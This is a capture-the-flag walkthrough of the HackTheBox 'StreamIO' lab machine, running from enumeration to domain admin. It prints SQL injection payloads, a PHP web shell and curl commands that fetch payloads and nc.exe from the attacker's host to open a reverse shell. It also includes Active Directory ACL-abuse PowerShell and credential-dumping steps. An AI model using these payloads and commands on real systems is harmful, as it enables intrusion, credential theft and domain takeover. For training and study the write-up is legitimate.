# HackTheBox - StreamIO

## NMAP

```bash
Nmap scan report for 10.129.94.76
Host is up (0.16s latency).                                            
Not shown: 65518 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings:            
|   DNSVersionBindReqTCP:      
|     version         
|_    bind                    
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-05 02:07:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a 2c8d a0b8 b10a eefa be20 4abd ecaf
|_SHA-1: 6c6a 3f5c 7536 61d5 2da6 0e66 75c0 56ce 56e4 656d
|_ssl-date: 2022-06-05T02:10:14+00:00; +7h00m00s from scanner time.
| tls-alpn: 
445/tcp   open  microsoft-ds?                  
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cg
i-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/5%Time=629BAD66%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-05T02:09:37
|_  start_date: N/A

```

From the nmap scan we a domain name `streamIO.htb` and a subdomain `watch.streamIO.htb`, adding them in `/etc/hosts`file

<img src="https://i.imgur.com/hA0d33P.png"/>

## PORT 389 (LDAP)

Running `enum4linux` to enumerate LDAP

<img src="https://i.imgur.com/6LJHGC6.png"/>

<img src="https://i.imgur.com/kz0sh8Y.png"/>

It didn't found anything so moving onto smb for checking null authenticatioin

## PORT 139/445 (SMB)

Using `smbclient` to see if we can list shares with null authentication

<img src="https://i.imgur.com/7bhA9em.png"/>

## PORT 443 (HTTPS)

### streamIO.htb

<img src="https://i.imgur.com/4ZcA5Vt.jpg"/>

We can see three usernames on `about.php` so they might be helpful for us later

<img src="https://i.imgur.com/JVTEa6z.png"/>

There's also a login page, so testing for deafult credentials and sqli 

<img src="https://i.imgur.com/DfcEnHm.png"/>

Which neither worked

<img src="https://i.imgur.com/cR6q0Xb.png"/>

We have an option to register for account so let's do that

<img src="https://i.imgur.com/IJKPXX2.png"/>

But even after registering an account we were not able to login

<img src="https://i.imgur.com/68xNuWK.png"/>

Ran `gobuster` to fuzz for files and directories which showed an `admin` directory but it was forbidden to access

<img src="https://i.imgur.com/o3v7CFu.png"/>

<img src="https://i.imgur.com/dzfEKK0.png"/>

Running gobuster on `/admin/` showed some interesting files

<img src="https://i.imgur.com/IPBpqNF.png"/>

Here `master.php` display a message about being accessed through includes so I wasn't sure what it was talking about

<img src="https://i.imgur.com/XUOXDf4.png"/>


### watch.streamio.htb

<img src="https://i.imgur.com/8hqjGwa.png"/>

Running gobuster on this site showed some php files

<img src="https://i.imgur.com/QlQp6YL.png"/>

Checking the `search.php` it lets us search for a movie name

<img src="https://i.imgur.com/kf3xTHh.png"/>

Clicking on any of the movie name to watch it's going to show us a prompt that it isn't available to watch 

<img src="https://i.imgur.com/wzsvB7i.png"/>

This would be retrieving the names of the movie from a database so tried for a sqli with payload

```
d' or 1=1 --
```

<img src="https://i.imgur.com/TvGyDhI.png"/>

Which got blocked, I replaced or with and, and it didn't caught the payload 

```
d' and 1=1 -- 
```

<img src="https://i.imgur.com/oqbSbfD.png"/>

Let's run sqlmap to see if we can dump the database

<img src="https://i.imgur.com/Et5Ul1s.png"/>

 It was able to determine that it was indeed vulnerable 

<img src="https://i.imgur.com/D65dsWi.png"/>

But it wasn't able to detemine the database reaon could be because of blocked.php filtering the payloads so we need to dump the database manually 

For that I tried finding the number of columns but it wasn't returning any error it was hard to identify the columns by including `@@version` in the column and then increasing the column if it wasn't showing in return

```sql
uwu' union select 1,@@version,3,4,5,6 -- 

```

<img src="https://i.imgur.com/TJmcvjR.png"/>

We know that the MSSQL is being used so now we need to enumerate tables for that we can use this payload 

```sql
uwu' union select 1,table_name,3,4,5,6 from information_schema.tables --
```

<img src="https://i.imgur.com/9L6GJrJ.png"/>

There's a `users` table , we need now need to know what columns exists in this table

```sql
uwu' union select 1,column_name,3,4,5,6 from information_schema.columns where table_name= 'users' --
```

<img src="https://i.imgur.com/zfLPa5W.png"/>

We can then extract username and password columns 

```sql
uwu' union select 1,username,3,4,5,6 from users --
```

<img src="https://i.imgur.com/YLqszvw.png"/>

```sql
uwu' union select 1,password,3,4,5,6 from users --
```

<img src="https://i.imgur.com/2oF2Lm9.png"/>

To make it easy, we can concatenate both columns to get a better result

```sql
uwu' union select 1,concat(username,':',password),3,4,5,6 from users --
```

<img src="https://i.imgur.com/a4fdgGd.png"/>

Using `curl` we can make a POST request without sqli payload and then use `sed ` and `awk` to get the usernames and passwords

```bash
curl -X POST 'https://watch.streamio.htb/search.php' -d 'q=uwu%27%20union%20select%201%2Cconcat%28username%2C%27%3A%27%2Cpassword%29%2C3%2C4%2C5%2C6%20from%20users%20%2D%2D' -k -s | grep h5 | sed -e 's/<h5 class="p-2">//g' -e 's/<\/h5>//g'| tr -d " \t"

```

I made a dirty little one liner to extract username and password hashes

Here we are making a POST request with `-d` having the post parameter `q` with the sqli payload to extract username and password hashes

Next we are using `grep` to grab text having `h5` tag as that's where the serach text is reflected back

Piping it to `sed ` we can replace `<h5 class="p-2">` with null character , the same with `</h5>` and then removing the tabs before the usernames with `tr -d "\t"`

<img src="https://i.imgur.com/3kVdczF.png"/>

We are now only left with usernames and password hashes which we can seperate using `awk` , `awk -F: '{print $1}'``


<img src="https://i.imgur.com/4QDvNte.png"/>


<img src="https://i.imgur.com/ul8zkXV.png"/>

<img src="https://i.imgur.com/eXrdw4R.png"/>


<img src="https://i.imgur.com/JVf1o00.png"/>

This cracked 12 hashes out of 30, so now let's try to perform bruteforce on login

We can use burpsuite or hydra to perform bruteforce but I found a tool named `patator` which I recently started to like for bruteforcing and fuzzing

```bash
python3 /opt/patator/patator.py http_fuzz 'url=https://streamio.htb/login.php' method=POST body='username=FILE0&password=FILE1' 0=./users.txt 1=./cracked_passwords.txt -x ignore:fgrep='Login failed'
```

Here to supply different wordlist we can use any name followed by a number like `0` which indicates the first wordlist so in this case `FILE0` and then we define the path to wordlist in `0` , similar we do this with `FILE1` andd then we can use `-x` to ingore the message in the response using `fgrep` for the string `Login Failed

<img src="https://i.imgur.com/YG57owv.png"/>

This has found the valid login `yoshide : 66boysandgirls..`, After logging in, we can access the admin panel and can see that this user has access to some functionality

<img src="https://i.imgur.com/DFf2aVF.png"/>

Going through each of the management page, we see a GET parameter

<img src="https://i.imgur.com/AeVioOA.png"/>

<img src="https://i.imgur.com/QPlToQ6.png"/>

So maybe there's a parameter we are not seeing, so fuzzing it through `wfuzz`, for that we'll need to use yoshihide's session as we cannot access admin without being authenticated

```bash
wfuzz -c -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt  -u 'https://streamio.htb/admin/?FUZZ' -b 'PHPSESSID=j20051o8t1rbshc9doco26al06' --hh 1678
```

<img src="https://i.imgur.com/3HPFpKq.png"/>

This finds a parameter `debug`, and with this we can perform Local File Inclusion to read the master.php file we found in the /admin directory

<img src="https://i.imgur.com/PKu2gni.png"/>

The contents of the page are changed which means that we were able to include master.php file, so now to view the source code, we can use  a php base64 filter to encode the contents of the page so that the browser doesn't execute the php code and we can get source code

```php
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

<img src="https://i.imgur.com/cwXedGq.png"/>

```php
yr<h1>Movie managment</h1>                                             
<?php                                                                  
if(!defined('included'))                                                                                                                      
        die("Only accessable through includes");                                                                                              
if(isset($_POST['movie_id']))                                                                                                                 
{                                  
$query = "delete from movies where id = ".$_POST['movie_id'];        
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
		$query = "select * from users where is_staff = 1 ";                                                                                   [37/539]
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

At the bottom of the source code we can see `eval` being used on `file_get_contents` on the POST parameter `include` , so we can include any php file and if it contains php code it's going to be executed 

So creating a file a php file having the contents

```php
system($_GET['cmd']);
```

Hosting this through python server using `curl` to make a POST request

```bash
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=dir' -k -b 'PHPSESSID=bg2lbvk5d9pvrjub67e5aib3rk' -d 'include=http://10.10.14.26:2222/test.php
```

<img src="https://i.imgur.com/Pq8a6IO.png"/>

We have command execution, so let's try getting a shell by downloading `nc` and executing it 

```bash
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=curl+10.10.14.26:2222/nc.exe+-o+C:\Windows\Temp\nc.exe' -k -b 'PHPSESSID=bg2lbvk5d9pvrjub67e5aib3rk' -d 'include=http://10.10.14.26:2222/test.php'
```

```bash
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=C:\Windows\Temp\nc.exe+10.10.14.26+3333+-e+cmd.exe' -k -b 'PHPSESSID=bg2lbvk5d9pvrjub67e5aib3rk' -d 'include=http://10.10.14.26:2222/test.php'
```

<img src="https://i.imgur.com/ddhxfyw.png"/>

Running `whoami` will return that we are yoshihde user on the system

<img src="https://i.imgur.com/CB1RB5g.png"/>

<img src="https://i.imgur.com/sqTvakB.png"/>

And this user is a normal domain user, checking `C:\Users` there two users `Matrin` and `nikk37` but we don't have access to these directories

<img src="https://i.imgur.com/h6RzCHm.png"/>

Uploading `sharphound.exe` to gather data about the domain 

<img src="https://i.imgur.com/pkkEObg.png"/>

To transfer this on to our local machine, we can copy the archive file to `C:\inetpub\streamio.htb` and download the file from the site

<img src="https://i.imgur.com/HXIvdlR.png"/>

```bash
https://streamio.htb/20220611010818_BloodHound.zip
```

Unzip the archive from which we'll get json files and upload them to bloodhound GUI

<img src="https://i.imgur.com/gKU18EV.png"/>

Looking through the pre-built quries I didn't find any way to escalate from yoshihide to any user 

<img src="https://i.imgur.com/4brZyAj.png"/>
  
  Jdgood seems to be write owner of `Core Staff` group which can read LASPS other than that there was nothing interesting.
  
We can find credentials for `db_user` from `login.php`
  
  <img src="https://i.imgur.com/Hpn1ofT.png"/>
  
  Also we can find password for `db_admin`
  
  <img src="https://i.imgur.com/nUZILIp.png"/>
  
  I tried using `sqlcmd` to login using cmd but it failed 
  
  <img src="https://i.imgur.com/0MufQK6.png"/>
  
  <img src="https://i.imgur.com/0lvjB95.png"/>
  
 Later uploaded `chisel` to port forward port 1433
 
 <img src="https://i.imgur.com/06sBHpf.png"/>
 
 <img src="https://i.imgur.com/oVzFSWe.png"/>
 
 With `sqsh` we can login to MSSQL and execute quries in the `STREAMIO` database
 
 <img src="https://i.imgur.com/9P9ND7o.png"/>
  
But we already know that only tables exits in this database, so let's see if there are any other databases

```sql
SELECT name FROM master.dbo.sysdatabases;
go
```

<img src="https://i.imgur.com/SioBCAP.png"/>

This shows a database named `streamio_backup` 

<img src="https://i.imgur.com/DvnlMXd.png"/>

But db_user isn't able to access this database, we already have the credentials for db admin so let's use that to access this database

<img src="https://i.imgur.com/aWdmnV3.png"/>

Listing the tables with 

```sql
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' 
```

We can see a users table having 8 users

<img src="https://i.imgur.com/gDnyn86.png"/>

<img src="https://i.imgur.com/wpdD9kF.png"/>

That has nikk37's hash which is a user on the system, checking if crackstation can crack this hash

<img src="https://i.imgur.com/ig2OXQa.png"/>

Since winrm is open pn the box, we can use `evil-winrm` to login as nikk37

<img src="https://i.imgur.com/5kDaFWn.png"/>

After getting a shell as nikk37 I ran `winpeas.bat` which showed that there was a firefox profile

<img src="https://i.imgur.com/LgPP2dQ.png"/>

From here we only need `logins.json` and `key4.db`, we can use impacket's smb server to transfer files 

<img src="https://i.imgur.com/ZmuW1Us.png"/>

<img src="https://i.imgur.com/SiOTtxB.png"/>

<img src="https://i.imgur.com/yumFl2s.png"/>

<img src="https://i.imgur.com/sUyHDcP.png"/>

Using `firepwd` a python script to decrypt firefox passwords we can get the passwords from the logins.json and key4.db by having them in the same directory

https://github.com/lclevy/firepwd

<img src="https://i.imgur.com/T6RiQWt.png"/>

<img src="https://i.imgur.com/4ey9LuD.png"/>

Brute forcing the passwords we'll get `JDg0dd1s@d0p3cr3@t0r` as the correct password

<img src="https://i.imgur.com/Ki9DoL6.png"/>

Jdgodd isn't in remote desktop user so we can't get a shell or execute commands but we can use the credentials in the process as this user is WriteOwner of `Core Staff` group

First we'll need to create a credential object so that credentials can be used in the process

```powershell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
 
 
 $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
 
```

Next use powerview to make the user the owner of the group

```powershell

 Set-DomainObjectOwner -Credential $Cred -Identity "CORE STAFF" -OwnerIdentity "JDgodd"
 ```

<img src="https://i.imgur.com/Plm6Xh3.png"/>


Adding all rights to the group

```powershell
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Rights All -Verbose -Credential $Cred
```

<img src="https://i.imgur.com/oDm6zJ2.png"/>

Adding Jdogdd to the group as the member 

```powershell
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Credential $cred -Verbose
```

<img src="https://i.imgur.com/u8Ut6sB.png"/>

Now we can read LAPS password through crackmapexec and can login as the administrator

```bash
cme ldap streamio.htb -d streamio.htb -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
```

<img src="https://i.imgur.com/uGMtkTp.png"/>

<img src="https://i.imgur.com/bSSzFdc.png"/>

Being an administrator as he's a domain admin, we can dump NTDS.dit with `secretsdump.py` `from impacket

<img src="https://i.imgur.com/yLR0H7S.png"/>

<img src="https://i.imgur.com/BJsLbgz.png"/>

## References

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
- https://stackoverflow.com/questions/9953448/how-to-remove-all-white-spaces-from-a-given-text-file
- https://github.com/lanjelot/patator
- https://stackoverflow.com/questions/5477163/how-to-switch-database-context-to-newly-created-database
- https://stackoverflow.com/questions/147659/get-list-of-databases-from-sql-server
- https://github.com/jpillora/chisel/releases/tag/v1.7.7
- https://www.sqlshack.com/working-sql-server-command-line-sqlcmd/
- https://github.com/lclevy/firepwd

